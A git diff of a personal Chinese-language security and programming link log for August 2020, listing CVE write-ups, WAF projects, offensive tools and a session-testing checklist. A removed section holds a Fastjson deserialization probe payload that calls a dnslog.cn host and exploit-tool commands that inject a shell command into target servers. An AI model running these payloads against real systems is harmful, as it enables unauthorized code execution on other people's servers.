@@ -1,6 +1,191 @@
 # 202008
 
+## 20200831
+
+http://speedle.io/
+
+## 20200828
+
+[看智能蓝牙指纹蓝牙锁是如何智障的](https://www.freebuf.com/articles/terminal/248052.html)
+
+## 20200827
+
+渗透测试方法：
+
+1. 取得带session的请求，退出，再试一下原来的session（cookie)请求，是否能用
+2. 取得带session的请求，等过期时间，再试一下原来的session（cookie)请求，是否能用
+3. 同上，等过期，看是否有专门的 Exp 之类的 cookie字段，处理有，A 使用 B的新的 Exp ，是否能用
+4. 修改密码，看是否能用
+
+CAPA：自动识别恶意软件行为
+https://www.freebuf.com/sectool/244831.html
+
+JXWAF(锦衣盾)是一款开源web应用防火墙
+https://github.com/jx-sec/jxwaf
+Jxwaf安装部署使用方案
+https://www.freebuf.com/articles/es/242689.html
+jxwaf性能测试报告
+https://www.freebuf.com/articles/es/246648.html
+
+无线电侧信道攻击利用（TempestSdr）复现：监听显示器显示内容
+https://www.freebuf.com/articles/wireless/246842.html
+
+挖洞经验 | Chrome浏览器的CSP策略绕过漏洞| 可以试一下，现在的版本基本都是83
+https://www.freebuf.com/articles/web/247141.html
+
+利用ZoomEye追踪多种Redteam C&C后渗透攻击框架
+https://www.freebuf.com/articles/network/247275.html
+
+内网渗透：不出网渗透技巧
+https://www.freebuf.com/articles/web/247287.html
+
+DGA域名检测的数据分析与深度学习分类
+https://www.freebuf.com/articles/network/246529.html
+
+JetBrains TeamCity 跨站脚本执行漏洞 (CVE-2020-15831)
+http://www.nsfocus.net/vulndb/48169
+
+【安全通报】Jackson 多个反序列化安全漏洞（CVE-2020-24616）
+https://nosec.org/home/detail/4542.html
+
+数据安全怎么做：数据分类分级
+https://www.freebuf.com/articles/database/247305.html
+自动化批量扫描工具fofa2Xray
+https://www.freebuf.com/sectool/244893.html
+
+MySQL蜜罐获取攻击者微信ID
+https://www.anquanke.com/post/id/215696
+
+七夕—2020HW热门0day分析与复现
+https://www.anquanke.com/post/id/215347
+
+## 20200825
+
+django的csrf保护
+In general, this can occur when there is a genuine Cross Site Request Forgery, or when Django's CSRF mechanism has not been used correctly. For POST forms, you need to ensure:
+https://docs.djangoproject.com/en/2.1/ref/csrf/
+
+[一个黑客写的开源情报方法和工具：在线情报实用指南](https://mp.weixin.qq.com/s/4VCiU1Oi94rKX9uCJ8YkbA)
+
+[基于WAF日志的扫描器检测实践](https://www.freebuf.com/articles/network/247466.html)
+
+[微信互联网平民创业（初稿）](https://github.com/xiaolai/everyones-guide-for-starting-up-on-wechat-network)
+
+https://github.com/loveunk/Deep-learning-books
+
+https://github.com/0xInfection/Awesome-WAF
+https://github.com/drduh/macOS-Security-and-Privacy-Guide/blob/master/README-cn.md
+The ultimate WinRM shell for hacking/pentesting
+https://github.com/Hackplayers/evil-winrm
+📙 Markdown Templates for Offensive Security OSCP, OSWE, OSCE, OSEE, OSWP exam report
+https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
+Web CTF CheatSheet 🐈
+https://github.com/w181496/Web-CTF-Cheatsheet
+
+
+Linux/OSX/FreeBSD resource monitor
+https://github.com/aristocratos/bpytop
+
+https://github.com/launchbadge/sqlx
+
+rust-ui
+https://github.com/hecrj/iced
+https://github.com/linebender/druid
+
+Canvas is a modern, open-source LMS developed and maintained by Instructure Inc. It is released under the AGPLv3 license for use by anyone interested in learning more about or using learning management systems.
+https://github.com/instructure/canvas-lms
+A learning management system (LMS)
+学习管理系统是一种软件应用程序，用于管理、记录、跟踪、报告、自动化提供教育课程、培训计划或学习和发展计划。学习管理系统概念直接脱胎于线上学习。虽然最早的LMS出现在高等教育领域，但最广泛采用LMS的是企业市场。学习管理系统是学习系统市场的最大组成部分。LMS在20世纪90年代末首次出现。 维基百科
+
+
+
+## 20200824
+
+https://degoogle.jmoore.dev/
+
+## 20200822
+
+https://github.com/github/archive-program/blob/master/TheTechTree.md
+为了让后代了解我们如何开发和使用软件，GitHub 官方开出了一个书单，称为"技术树"（the Tech Tree），包括16个大类的200多本经典书籍。这些书籍的数字化版本，将存放在 GitHub 的北极仓库。
+
+[Struts2 S2-059 漏洞分析](https://www.anquanke.com/post/id/214843)
+
+[近期公开0day及漏洞汇总](https://www.freebuf.com/articles/web/247465.html)
+
+[从存储型self-XSS到最终实现账号完全接管](https://www.freebuf.com/articles/web/247355.html)
+
+[哨兵：如何0成本搭建企业蜜网](https://www.freebuf.com/articles/system/247376.html)
+
+[JBass弱口令及任意文件下载漏洞分析](https://www.freebuf.com/articles/web/246361.html)
+
+Empire is a PowerShell and Python 3.x post-exploitation framework.
+https://github.com/BC-SECURITY/Empire
+
+两个都可以登录
+这个好像和 http://www.cnnvd.org.cn/ 不是一个
+https://www.cnvd.org.cn/
+
+[Go二进制文件逆向分析从基础到进阶——综述](https://www.anquanke.com/post/id/214940)
+
+[shiro < 1.6.0的认证绕过漏洞分析(CVE-2020-13933)](https://www.anquanke.com/post/id/214964)
+
+[利用 ZoomEye 追踪多种 Redteam C&C 后渗透攻击框架](https://www.anquanke.com/post/id/214897)
+
+[如何编写一份专业的渗透测试报告](https://www.anquanke.com/post/id/215031)
+目标确认
+信息收集
+漏洞发现
+漏洞利用
+权限维持内网渗透
+目标获取痕迹清理
+编写文档输出报告
+
+概述、漏洞摘要、渗透利用、测试结果、安全建议
+特别注意的是：
+漏洞描述切忌不可过于简单，一笔带过；
+在安全建议部分避免提出没有实际意义的安全建议，比如加强安全意识；
+太多复杂的专业术语，比如绕狗、x站等等；
+报告结构混乱不堪。
+https://github.com/juliocesarfort/public-pentesting-reports
+http://www.doc88.com/p-7912041629982.html
+https://finsenty54.github.io/2019/03/28/penetration-test-report-interpretation/
+https://max.book118.com/html/2017/0613/114524057.shtm
+https://zhishihezi.net/
+
+## 20200821
+
+[Rodauth: A Refreshing Authentication Solution for Ruby](https://janko.io/rodauth-a-refreshing-authentication-solution-for-ruby/)
+
+[单一职责原则](https://www.cnblogs.com/gaochundong/p/single_responsibility_principle.html)
+
+在面向对象编程领域中，单一功能原则规定每个类都应该有一个单一的功能，并且该功能应该由这个类完全封装起来。所有它的服务都应该严密的和该功能平行。 这个术语由罗伯特·C·马丁在他的《敏捷软件开发，原则，模式和实践》一书中的一篇名为〈面向对象设计原则〉的文章中给出
+Rodauth 是使用 Roda 和 Sequel 实现的
+devise-security
+
+https://pdabrowski.com/articles/how-sidekiq-really-works
+
+https://www.honeybadger.io/blog/database-transactions-rails-activerecord/
+
+http://stratus3d.com/blog/2020/08/11/effective-debugging-of-memory-leaks-in-ruby/
+https://idiosyncratic-ruby.com/74-super-snakes.html
+
+[基于安卓设备的Hacking](https://www.freebuf.com/articles/others-articles/246679.html)
+
+[甲方自研分布式WAF落地全程实录](https://www.freebuf.com/articles/es/245977.html)
+https://openresty.org/cn/
+Web应用程序防火墙(ngx_lua_waf或X-WAF)产品
+这个好像还是一个nginx的CVE连动的
+https://hackerone.com/reports/513236
+
 ## 20200820
+
+https://www.thinbug.com/q/13384443
+https://wiki.openstack.org/wiki/KeyManager
+https://sourceforge.net/projects/strongkey/
+https://www.secrss.com/articles/11755
+https://square.github.io/keywhiz/
+
+KLMS over KMIP是一款优秀且易于使用的密钥管理解决方案。 这是一个用Java编写的开源解决方案。请参阅以下链接以供参考。 http://www.ibm.com/developerworks/library/se-kmip4j/
 
 [【安全通报】Jenkins Jetty组件漏洞风险通告（CVE-2019-17638）](https://nosec.org/home/detail/4533.html)
 
@@ -216,11 +401,7 @@ https://github.com/ageron/handson-ml2
 
 https://www.ruby-toolbox.com/categories/Table_Builders
 
-DDoS高防接入配置最佳实践
-https://help.aliyun.com/document_detail/106219.html
 
-﻿RangeAmp攻击：将CDN变成DDoS加农炮
-https://www.inforsec.org/wp/?p=3997
 
 WebLogic coherence UniversalExtractor 反序列化 (CVE-2020-14645) 漏洞分析
 https://www.anquanke.com/post/id/212984
@@ -333,24 +514,7 @@ https://serverfault.com/questions/83856/allow-scp-but-not-actual-login-using-ssh
 
 ## 20200803
 
-[不安全的序列化](https://www.freebuf.com/articles/web/244476.html)
 
-[Fastjson批量检查及一键利用工具](https://www.freebuf.com/sectool/244113.html)
-[Fastjson1.2.24漏洞复现详细过程](https://www.freebuf.com/articles/web/242712.html)
-
-访问地址: 118.193.36.37:43170
-{ "zeo": {"@type":"java.net.Inet4Address","val":"m9ng8n.dnslog.cn"]]
-https://github.com/mrknow001/fastjson_rec_exploit
-git clone git@github.com:mrknow001/fastjson_rec_exploit.git
-118.89.54.172
-python3 fastjson.py -u http://192.168.1.3/ -s 192.168.1.1 -c "touch /tmp/test.txt
-python fastjson_rce_exploit.py -u http://192.168.56.107:8090/ -s 192.168.56.1 -c "touch /tmp/test.txt"
-
-https://github.com/mrknow001/fastjson_rec_exploit/archive/master.zip
-
-[vulhub](https://vulhub.org/)
-
-[基础篇-XSS盲打](https://cloud.tencent.com/developer/article/1078996)
 
 [NIDS(suricata)中的ICMP隐蔽隧道检测](https://www.freebuf.com/articles/es/243486.html)
 
